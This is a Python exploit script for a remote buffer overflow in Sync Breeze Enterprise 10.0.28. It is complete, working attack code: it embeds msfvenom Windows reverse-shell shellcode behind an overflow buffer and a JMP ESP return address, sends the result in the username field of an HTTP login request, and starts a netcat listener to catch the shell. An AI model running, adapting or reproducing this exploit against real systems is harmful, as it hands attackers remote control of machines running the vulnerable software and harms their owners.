#!/bin/usr/python
#############################################################
#  Sync Breeze Enterprise 10.0.28 - Remote Buffer Overflow  #
#           https://github.com/victorpavoni                 #
#############################################################
import socket,sys,os

if len(sys.argv) != 2:
    print(f"Modo de uso: python {sys.argv[0]} 127.0.0.1")
    sys.exit(0)

ip = str.encode(sys.argv[1])

# MSFVENOM
# windows/shell_reverse_tcp
# Bad Chars \x00\x0a\x0d\x25\x26\x2b\x3d
SHELL =  b""
SHELL += b"\xdb\xd8\xd9\x74\x24\xf4\xba\x64\x92\xbf\x0c\x58"
SHELL += b"\x31\xc9\xb1\x52\x31\x50\x17\x83\xc0\x04\x03\x34"
SHELL += b"\x81\x5d\xf9\x48\x4d\x23\x02\xb0\x8e\x44\x8a\x55"
SHELL += b"\xbf\x44\xe8\x1e\x90\x74\x7a\x72\x1d\xfe\x2e\x66"
SHELL += b"\x96\x72\xe7\x89\x1f\x38\xd1\xa4\xa0\x11\x21\xa7"
SHELL += b"\x22\x68\x76\x07\x1a\xa3\x8b\x46\x5b\xde\x66\x1a"
SHELL += b"\x34\x94\xd5\x8a\x31\xe0\xe5\x21\x09\xe4\x6d\xd6"
SHELL += b"\xda\x07\x5f\x49\x50\x5e\x7f\x68\xb5\xea\x36\x72"
SHELL += b"\xda\xd7\x81\x09\x28\xa3\x13\xdb\x60\x4c\xbf\x22"
SHELL += b"\x4d\xbf\xc1\x63\x6a\x20\xb4\x9d\x88\xdd\xcf\x5a"
SHELL += b"\xf2\x39\x45\x78\x54\xc9\xfd\xa4\x64\x1e\x9b\x2f"
SHELL += b"\x6a\xeb\xef\x77\x6f\xea\x3c\x0c\x8b\x67\xc3\xc2"
SHELL += b"\x1d\x33\xe0\xc6\x46\xe7\x89\x5f\x23\x46\xb5\xbf"
SHELL += b"\x8c\x37\x13\xb4\x21\x23\x2e\x97\x2d\x80\x03\x27"
SHELL += b"\xae\x8e\x14\x54\x9c\x11\x8f\xf2\xac\xda\x09\x05"
SHELL += b"\xd2\xf0\xee\x99\x2d\xfb\x0e\xb0\xe9\xaf\x5e\xaa"
SHELL += b"\xd8\xcf\x34\x2a\xe4\x05\x9a\x7a\x4a\xf6\x5b\x2a"
SHELL += b"\x2a\xa6\x33\x20\xa5\x99\x24\x4b\x6f\xb2\xcf\xb6"
SHELL += b"\xf8\x7d\xa7\xbe\x78\x15\xba\xbe\x79\x5d\x33\x58"
SHELL += b"\x13\xb1\x12\xf3\x8c\x28\x3f\x8f\x2d\xb4\x95\xea"
SHELL += b"\x6e\x3e\x1a\x0b\x20\xb7\x57\x1f\xd5\x37\x22\x7d"
SHELL += b"\x70\x47\x98\xe9\x1e\xda\x47\xe9\x69\xc7\xdf\xbe"
SHELL += b"\x3e\x39\x16\x2a\xd3\x60\x80\x48\x2e\xf4\xeb\xc8"
SHELL += b"\xf5\xc5\xf2\xd1\x78\x71\xd1\xc1\x44\x7a\x5d\xb5"
SHELL += b"\x18\x2d\x0b\x63\xdf\x87\xfd\xdd\x89\x74\x54\x89"
SHELL += b"\x4c\xb7\x67\xcf\x50\x92\x11\x2f\xe0\x4b\x64\x50"
SHELL += b"\xcd\x1b\x60\x29\x33\xbc\x8f\xe0\xf7\xdc\x6d\x20"
SHELL += b"\x02\x75\x28\xa1\xaf\x18\xcb\x1c\xf3\x24\x48\x94"
SHELL += b"\x8c\xd2\x50\xdd\x89\x9f\xd6\x0e\xe0\xb0\xb2\x30"
SHELL += b"\x57\xb0\x96"

# JMP ESP
esp = b"\x83\x0c\x09\x10"

payload = b"A" * 780 + esp + b"\x90" * 16 + SHELL
tam = str.encode(str(len(payload) + 20))

request=b"POST /login HTTP/1.1\r\n"
request+=b"Host: "+ip+b"\r\n"
request+=b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\n"
request+=b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
request+=b"Accept-Language: en-US,en;q=0.5\r\n"
request+=b"Accept-Encoding: gzip, deflate, br\r\n"
request+=b"Content-Type: application/x-www-form-urlencoded\r\n"
request+=b"Content-Length: "+tam+b"\r\n"
request+=b"Origin: http://"+ip+b"\r\n"
request+=b"Connection: close\r\n"
request+=b"Referer: http://"+ip+b"/login\r\n"
request+=b"Upgrade-Insecure-Requests: 1\r\n"
request+=b"\r\n"
request+=b"username="+payload+b"&password=A"

print("[+] Enviando shellcode...")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1],80))
s.send(request)
os.system("nc -lvnp 443")
